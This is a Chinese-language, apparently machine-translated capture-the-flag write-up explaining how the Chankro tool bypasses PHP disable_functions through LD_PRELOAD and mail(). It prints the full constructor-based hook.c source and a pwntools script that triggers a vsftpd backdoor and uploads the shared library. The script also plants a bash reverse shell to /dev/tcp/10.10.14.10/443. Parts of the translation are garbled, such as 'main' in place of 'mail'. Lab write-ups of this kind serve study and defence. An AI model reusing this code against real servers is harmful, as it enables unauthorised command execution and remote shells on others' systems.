背景

Chankro是一个绕过disable_functionsphp来获取执行的工具。这是常见的内容拥有者建立与PHP disable_functions设置为阻止system，shell从得到命令执行等，从理论上讲，防止谁找到一种方式来运行arbirary PHP代码攻击。

在Linux主机上，当mail调用php函数时，它会调用二进制文件sendmail。Chankro的想法是将LD_PRELOAD环境变量设置为包含共享库然后调用mail，共享库将被执行。

hook.c，编译hook32.so并且hook64.so非常简单：

#define  _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>


void pwn(void) {
	chmod(getenv("CHANKRO"), 00777);
        system(getenv("CHANKRO"));
}

void daemonize(void) {
	signal(SIGHUP, SIG_IGN);
	if (fork() != 0) {
		exit(EXIT_SUCCESS);
	}
}

__attribute__ ((__constructor__)) void preloadme(void) {
  unsetenv("LD_PRELOAD");
  daemonize();
  pwn();
}

它基本上清理了LD_PRELOADenvironemnt变量，然后从CHANKRO环境变量中获取二进制文件的名称，将权限更改为777，并调用它system。

在repo中有一个python脚本来运行它，但对于这些用例，更有用的路径是四个步骤：

  1. 上传.so文件和要执行的文件（shell脚本或elf）。

  2. 将环境变量设置LD_PRELOAD为指向.so。

  3. 将环境变量设置CHANKRO为指向要执行的文件。

  4. main('a','a','a','a');在php中运行。

这将导致脚本的执行。

LaCasaDePapel

这里最大的挑战是将.so文件上传到目标。我无法使用base64来使用file_put_contents它，因为它太大了。所以我选择了和Alamot一样的路线并编写脚本。我拿了我的通用vsftpd_backdoor.py并将其修改为上传并触发Chankro。这段代码非常草率，但我只是把它放在一起用于测试目的：

#!/usr/bin/env python

import sys
import time
from pwn import *

if len(sys.argv) < 2:
    print("%s [ip] [port = 21]" % sys.argv[0])
    print("port defaults to 21 if not given")
    sys.exit()
elif len(sys.argv) == 2:
    port = 21
else:
    port = int(sys.argv[2])
target = sys.argv[1]

print("[*] Connecting to %s:%d" % (target, port))
ftp = remote(target, port)
ftp.sendline(b'USER 0xdf:)')
ftp.sendline(b'PASS 0xdf')
time.sleep(2)
ftp.close()
print('[+] Backdoor triggered')
print('[*] Connecting')

try:
    psy = remote(target, 6200)
except KeyboardInterrupt:
    print("[!] Exiting Shell")
    exit(1)

print("[*] Uploading chankro.so")
psy.sendline("$f = fopen('/tmp/chankro.so', 'w');")
with open('/opt/Chankro/hook64.so', 'rb') as f:
    while True:
        d = f.read(1024)
        if not d:
            break
        psy.sendline("fwrite($f, base64_decode('%s'));" % base64.b64encode(d))

psy.sendline("fclose($f)")
print("[+] Uploaded chankro.so")
shell = base64.b64encode("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'")
psy.sendline("file_put_contents('/tmp/acpid.socket', base64_decode('%s'))" % shell)
print("[+] Uploaded shell as /tmp/acpid.socket")
psy.sendline("putenv('CHANKRO=/tmp/acpid.socket');")
psy.sendline("putenv('LD_PRELOAD=/tmp/chankro.so');")
print("[+] Set env variables")
print("[*] Triggering with mail call\n[*] Waiting for shell. This could take a minute.")
psy.sendline("mail('a','a','a','a');")
psy.close()

dali = listen(443).wait_for_connection()
dali.interactive()

结论

当我看到这种技术时，我的脑子立刻去了HackBack，因为它可以让我得到一个我以前无法获得的shell（以一种可靠的方式）。但是，我很快意识到HackBack是一个Windows盒子，因此该技术根本不适用。我可以上传文件，但是调用邮件会做一些不同的事情，而且LD_PRELOAD在Windows中没有，至少在这一点上我不能与之交互。如果有办法绕过disable_functionsWindows，这将是一个有趣的研究领域。
